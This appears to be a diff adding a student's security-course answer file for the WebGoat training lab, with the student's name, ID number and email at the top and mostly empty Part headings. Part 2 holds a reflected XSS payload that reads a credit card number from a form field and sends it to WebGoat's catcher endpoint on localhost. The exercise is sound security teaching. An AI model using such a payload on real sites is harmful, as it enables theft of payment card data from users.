@@ -1,0 +1,40 @@
+#Tiancheng Sheng, 1007429819, tc.sheng@mail.utoronto.ca
+
+
+Part 1
+
+
+
+Part 2
+http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=<script>
+var card_num = document.getElementsByName("input1")[0].value;
+var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + card_num;
+XssImage = new Image;
+XssImage.src = url;
+</script>
+
+
+Part 3
+
+
+
+Part 4
+
+
+
+Part 5
+
+
+
+Part 6
+
+
+
+Part 7
+
+
+
+Part 8
+
+
+
